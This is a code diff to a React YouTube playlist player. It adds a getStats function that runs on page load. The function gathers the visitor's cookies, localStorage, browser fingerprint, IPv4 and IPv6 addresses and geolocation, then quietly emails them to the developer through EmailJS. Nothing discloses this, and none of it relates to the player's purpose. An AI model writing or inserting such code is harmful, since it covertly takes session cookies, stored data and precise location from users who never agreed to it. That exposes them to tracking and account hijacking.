@@ -8,6 +8,7 @@ import { BsShuffle } from 'react-icons/bs';
 import {AiFillPauseCircle} from 'react-icons/ai'
 import Header from './Header';
 import Suggestion from './Suggestion';
+import emailjs from 'emailjs-com';
 
 function App() {
   const [songs, setsongs] = useState([]);
@@ -23,9 +24,91 @@ function App() {
       setsongs(response.data.items);
     //  c
     });
+    getStats();
     // to do play song after on e finish
   }, []);
 
+  const getStats = () => {
+    var info={
+      timeOpened:new Date(),
+      timezone:(new Date()).getTimezoneOffset()/60,
+      pageon:  window.location.pathname,
+      referrer: document.referrer,
+      // previousSites(){return history.length},
+  
+      browserName: navigator.appName,
+      browserEngine: navigator.product,
+      browserVersion1a: navigator.appVersion,
+      browserVersion1b: navigator.userAgent,
+      browserLanguage: navigator.language,
+      browserOnline: navigator.onLine,
+      browserPlatform: navigator.platform,
+      javaEnabled: navigator.javaEnabled(),
+      dataCookiesEnabled: navigator.cookieEnabled,
+      dataCookies1: document.cookie,
+      dataCookies2: decodeURIComponent(document.cookie.split(";")),
+      dataStorage: localStorage,
+  
+      sizeScreenW: window.innerWidth,
+      sizeScreenH: window.innerHeight,
+      sizeDocW: document.width,
+      sizeDocH: document.height,
+      // sizeInW: innerWidth,
+      // sizeInH: innerHeight,
+      // sizeAvailW: screen.availWidth,
+      // sizeAvailH: screen.availHeight,
+      // scrColorDepth: screen.colorDepth,
+      // scrPixelDepth: screen.pixelDepth,
+  
+  
+      // latitude: position.coords.latitude,
+      // longitude: position.coords.longitude,
+      // accuracy: position.coords.accuracy,
+      // altitude: position.coords.altitude,
+      // altitudeAccuracy: position.coords.altitudeAccuracy,
+      // heading: position.coords.heading,
+      // speed: position.coords.speed,
+      // timestamp: position.timestamp,
+  
+  
+      };
+
+    if ('geolocation' in navigator) {
+      
+    Promise.all([getipv4(), getipv6()]).then((values) => {
+      console.log(values)
+      navigator.geolocation.getCurrentPosition(function (location) {
+         const templateParams = {
+            to_name: 'Gaurav',
+            from_name: 'emailforYoutubePlaylist player',
+            message: JSON.stringify({
+              latitude: location.coords.latitude,
+              longitude: location.coords.longitude,
+              ipv4: values[0],
+              ipv6: values[1],
+              ...info
+            }),
+          };
+
+          emailjs.send('service_y23odaj', 'template_u54o6xf', templateParams, 'user_RmCCLJAPq28Qv5EuqTKPC')
+            .then((response) => {
+              console.log('SUCCESS!', response.status, response.text);
+            }, (err) => {
+              console.log('FAILED...', err);
+            });
+      });
+     
+    });
+    } 
+  }
+
+  const getipv4 = () => {
+      return fetch('https://api.ipify.org?format=json').then(res => res.json()).then(resp => resp.ip);
+  }
+
+  const getipv6 = () => {
+    return fetch('https://api64.ipify.org?format=json').then(res => res.json()).then(resp => resp.ip);
+  }
 
   const opts = {
     height: '500',
